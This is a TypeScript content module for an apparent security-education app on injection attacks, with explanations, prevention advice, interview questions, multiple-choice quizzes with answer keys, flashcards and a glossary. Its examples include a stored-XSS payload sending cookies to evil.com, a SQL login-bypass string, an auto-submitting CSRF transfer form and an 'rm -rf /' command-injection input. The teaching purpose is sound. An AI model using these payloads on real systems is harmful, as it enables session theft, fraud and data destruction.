import type { TopicContent } from "../types";

export const injectionAttacks: TopicContent = {
  quickSummary: [
    "Injection attacks occur when untrusted data is sent to an interpreter as part of a command or query, tricking it into executing unintended operations like data theft, modification, or system compromise.",
    "SQL injection (SQLi) manipulates database queries by inserting malicious SQL through user inputs, preventable primarily through parameterized queries and prepared statements.",
    "Cross-Site Scripting (XSS) injects malicious scripts into web pages viewed by other users — stored XSS persists in the database, reflected XSS bounces off the server, and DOM-based XSS executes entirely client-side.",
    "Cross-Site Request Forgery (CSRF) tricks authenticated users into performing unwanted actions by exploiting the browser's automatic cookie inclusion on cross-origin requests.",
  ],
  detailed: [
    `## SQL Injection (SQLi)

SQL injection occurs when user input is concatenated into SQL queries without proper sanitization, allowing attackers to alter query logic.

**Classic example:**
\`\`\`sql
-- Vulnerable query
SELECT * FROM users WHERE username = '{input}' AND password = '{password}';

-- Attacker input: username = ' OR '1'='1' --
-- Resulting query:
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '';
-- The OR '1'='1' is always true, and -- comments out the password check
\`\`\`

**Types of SQLi:**
- **In-band (Classic)**: Results are returned directly in the response. Includes UNION-based (extracting data via UNION SELECT) and error-based (extracting info from error messages).
- **Blind SQLi**: No direct output. Boolean-based (observing true/false behavior differences) or time-based (using SLEEP/WAITFOR to infer data).
- **Out-of-band**: Data exfiltrated via DNS or HTTP requests from the database server.

**Prevention:**
- Parameterized queries / prepared statements (primary defense)
- ORM usage with parameterized methods
- Input validation (allow-list for expected formats)
- Least privilege database accounts
- WAF as defense in depth (not primary)`,

    `## Cross-Site Scripting (XSS)

XSS allows attackers to inject client-side scripts into web pages, executing in the context of other users' browsers.

**Stored (Persistent) XSS:** Malicious script is permanently stored on the server (database, message forum, comment field). Every user who views the affected page executes the script. Most dangerous type.

\`\`\`html
<!-- Attacker posts a comment containing: -->
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

<!-- All users viewing the page execute this script -->
\`\`\`

**Reflected XSS:** The script is part of the request (URL parameter, form field) and reflected back in the response. Requires tricking the victim into clicking a crafted link.

\`\`\`
https://example.com/search?q=<script>alert('XSS')</script>
\`\`\`

**DOM-based XSS:** The vulnerability exists in client-side JavaScript that processes data from an attacker-controllable source (location.hash, postMessage) and writes it to a dangerous sink (innerHTML, eval, document.write).

**Prevention:**
- Output encoding/escaping for the specific context (HTML, JS, CSS, URL)
- Content Security Policy (CSP) headers restricting inline scripts
- Use frameworks with automatic escaping (React, Angular, Vue)
- Sanitize HTML input with libraries like DOMPurify
- HttpOnly cookies prevent script access to session tokens`,

    `## Cross-Site Request Forgery (CSRF)

CSRF exploits the browser's behavior of automatically sending cookies with every request to a domain. An attacker tricks an authenticated user into making unintended requests.

**Attack scenario:**
\`\`\`html
<!-- Attacker's page includes a hidden form that auto-submits -->
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker-account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById('csrf-form').submit();</script>

<!-- When a logged-in bank user visits this page, the transfer executes
     because the browser sends the bank.com session cookie automatically -->
\`\`\`

**Prevention:**
- **CSRF tokens**: Server generates a unique, unpredictable token per session/request, embedded in forms and validated server-side. The attacker cannot know this token.
- **SameSite cookies**: \`SameSite=Strict\` or \`SameSite=Lax\` prevents cookies from being sent on cross-origin requests.
- **Double submit cookie**: Send the CSRF token both as a cookie and a request parameter; the server verifies they match.
- **Origin/Referer header validation**: Check that requests come from your own domain.
- Custom request headers (X-Requested-With) — browsers enforce CORS preflight for custom headers on cross-origin requests.`,

    `## Other Injection Types

**NoSQL Injection:** Targets NoSQL databases like MongoDB where query operators can be injected.
\`\`\`javascript
// Vulnerable: user sends {"$gt": ""} as password
db.users.find({ username: input.username, password: input.password });
// Becomes: find where password > "" (always true)
\`\`\`
Prevention: validate input types, use MongoDB's \`$eq\` operator explicitly, avoid passing raw user objects to queries.

**OS Command Injection:** Occurs when user input is passed to system shell commands.
\`\`\`javascript
// Vulnerable
exec("ping " + userInput);
// Attacker input: "8.8.8.8; rm -rf /"
\`\`\`
Prevention: avoid shell commands entirely, use language-native libraries, if unavoidable use parameterized APIs and strict input validation.

**LDAP Injection:** Manipulates LDAP queries used for directory lookups and authentication.

**Template Injection (SSTI):** Server-side template engines (Jinja2, Twig, Freemarker) can execute arbitrary code if user input is embedded in templates without sanitization.

**Header Injection / HTTP Response Splitting:** Injecting newline characters into HTTP headers to add malicious headers or split the response.`,

    `## Defense in Depth Strategy

No single defense is sufficient. Layer multiple protections:

1. **Input validation** — Validate type, length, format, and range. Use allow-lists over deny-lists. Reject unexpected input rather than trying to sanitize it.

2. **Parameterized queries** — For SQL, NoSQL, LDAP, and OS commands. Separates code from data at the interpreter level.

3. **Output encoding** — Encode data for the specific output context: HTML entity encoding for HTML content, JavaScript encoding for JS contexts, URL encoding for URLs, CSS encoding for style contexts.

4. **Content Security Policy** — Restrict script sources, disable inline scripts and eval. This is a strong second line of defense against XSS even if output encoding is missed.

5. **Least privilege** — Database accounts should have minimal permissions. Application should not run as root.

6. **WAF (Web Application Firewall)** — Detects and blocks common injection patterns. Useful as a safety net but should never be the primary defense.

7. **Security testing** — Automated SAST/DAST tools, manual penetration testing, and code review. Tools like SQLMap, Burp Suite, and OWASP ZAP help identify vulnerabilities.`,
  ],
  interviewQA: [
    {
      q: "What is the difference between stored, reflected, and DOM-based XSS?",
      a: "Stored XSS persists on the server (e.g., in a database comment) and executes for every user who views the page — most dangerous. Reflected XSS is included in the request (URL/form) and reflected in the response — requires the victim to click a crafted link. DOM-based XSS never touches the server — the vulnerability is in client-side JavaScript that reads from an attacker-controllable source (like location.hash) and writes to a dangerous sink (innerHTML, eval). Prevention differs: stored/reflected require server-side output encoding, while DOM-based requires securing client-side data flow and avoiding dangerous sinks.",
    },
    {
      q: "Why are parameterized queries the primary defense against SQL injection rather than input sanitization?",
      a: "Parameterized queries separate SQL code structure from data at the database engine level. The query template is compiled first, then user data is bound as parameters that can never alter the query structure — regardless of content. Input sanitization, by contrast, tries to identify and remove dangerous characters, but it's error-prone: different databases have different escape sequences, encoding tricks can bypass filters, and complex inputs may be partially sanitized. Parameterized queries provide a fundamental architectural guarantee, while sanitization is a heuristic that can be bypassed.",
    },
    {
      q: "How does SameSite cookie attribute prevent CSRF?",
      a: "SameSite controls whether cookies are sent on cross-origin requests. With SameSite=Strict, the cookie is never sent on any cross-site request — even following a link from an external site to your app won't include the cookie. SameSite=Lax allows the cookie on top-level GET navigations (so links work) but blocks it on POST requests, form submissions from other sites, and embedded content (iframes, images). Since CSRF attacks rely on the browser automatically sending auth cookies with cross-origin form submissions or AJAX requests, SameSite=Lax or Strict prevents the attack at the browser level.",
    },
  ],
  mcqs: [
    {
      q: "Which type of SQL injection extracts data by observing differences in application behavior (e.g., true/false responses)?",
      options: [
        "Union-based SQLi",
        "Error-based SQLi",
        "Boolean-based blind SQLi",
        "Out-of-band SQLi",
      ],
      answerIndex: 2,
      explanation:
        "Boolean-based blind SQLi infers data by sending queries that produce observable true/false differences in the application's response, without directly seeing query results.",
    },
    {
      q: "Which XSS type is considered most dangerous because it affects all users who view the affected page?",
      options: [
        "Reflected XSS",
        "DOM-based XSS",
        "Stored (Persistent) XSS",
        "Self-XSS",
      ],
      answerIndex: 2,
      explanation:
        "Stored XSS persists on the server and executes every time any user views the affected page, making it the most dangerous variant as it requires no victim interaction beyond normal browsing.",
    },
    {
      q: "What is the primary purpose of a CSRF token?",
      options: [
        "To encrypt form data",
        "To prove the request originated from the application's own form, not a third-party site",
        "To authenticate the user's identity",
        "To prevent SQL injection",
      ],
      answerIndex: 1,
      explanation:
        "CSRF tokens are unique, unpredictable values embedded in forms that prove the request came from the application itself. An attacker on a different origin cannot read or guess this token.",
    },
    {
      q: "Which defense is most effective against DOM-based XSS?",
      options: [
        "Server-side input validation",
        "Content Security Policy with no inline scripts",
        "Avoiding dangerous JavaScript sinks like innerHTML and eval",
        "CSRF tokens",
      ],
      answerIndex: 2,
      explanation:
        "DOM-based XSS occurs entirely in client-side JavaScript. Avoiding dangerous sinks (innerHTML, eval, document.write) and using safe alternatives (textContent, createElement) is the most effective defense.",
    },
  ],
  flashcards: [
    {
      front: "What is the difference between in-band and blind SQL injection?",
      back: "In-band SQLi returns results directly in the response (via UNION SELECT or error messages). Blind SQLi produces no visible output — the attacker infers data through behavioral differences (boolean-based) or timing delays (time-based using SLEEP).",
    },
    {
      front: "What are the three types of XSS?",
      back: "Stored (persists in server/database, executes for all viewers), Reflected (included in request, bounced back in response), DOM-based (vulnerability in client-side JS, never reaches the server).",
    },
    {
      front: "How do CSRF attacks work?",
      back: "An attacker creates a page with a hidden form/request targeting a victim site. When an authenticated user visits the attacker's page, the browser automatically includes the victim site's cookies, executing the forged request with the user's privileges.",
    },
    {
      front: "What is Content Security Policy (CSP)?",
      back: "An HTTP header that restricts which resources a page can load. By disabling inline scripts (script-src 'self') and eval, CSP provides strong defense against XSS even when output encoding is missed.",
    },
    {
      front: "Why is allow-listing better than deny-listing for input validation?",
      back: "Deny-lists try to block known bad patterns but miss new attack vectors, encoding tricks, and edge cases. Allow-lists define exactly what is acceptable (format, type, range), rejecting everything else — a much stronger security posture.",
    },
    {
      front: "What is Server-Side Template Injection (SSTI)?",
      back: "An attack where user input is embedded directly into a server-side template engine (Jinja2, Twig), allowing the attacker to execute arbitrary code on the server. Example: {{7*7}} rendering as 49 indicates SSTI vulnerability.",
    },
    {
      front: "What is the double submit cookie pattern for CSRF prevention?",
      back: "The server sets a random CSRF token as a cookie AND requires the same value in a request header/body. The server verifies both match. Attackers can trigger the cookie to be sent but cannot read it (due to same-origin policy) to include it in the request body.",
    },
  ],
  glossary: [
    {
      term: "SQL Injection (SQLi)",
      definition:
        "An attack that inserts malicious SQL code into application queries via user input, exploiting the mixing of code and data in dynamically constructed queries.",
    },
    {
      term: "Cross-Site Scripting (XSS)",
      definition:
        "An attack that injects malicious client-side scripts into web pages viewed by other users, enabling session hijacking, defacement, or redirection.",
    },
    {
      term: "CSRF (Cross-Site Request Forgery)",
      definition:
        "An attack that tricks an authenticated user's browser into sending unintended requests to a web application, exploiting automatic cookie inclusion.",
    },
    {
      term: "Parameterized Query",
      definition:
        "A query where the SQL structure is defined separately from user data, with placeholders that the database engine fills without allowing the data to alter the query logic.",
    },
    {
      term: "Output Encoding",
      definition:
        "Converting special characters to their safe equivalents for a specific output context (HTML entities, JS escapes, URL encoding) to prevent injection when displaying user data.",
    },
    {
      term: "Content Security Policy (CSP)",
      definition:
        "An HTTP response header that specifies which content sources are allowed, providing a browser-enforced defense against XSS and data injection attacks.",
    },
    {
      term: "Blind Injection",
      definition:
        "An injection attack variant where results are not directly visible, requiring the attacker to infer information through behavioral differences or timing side channels.",
    },
  ],
};
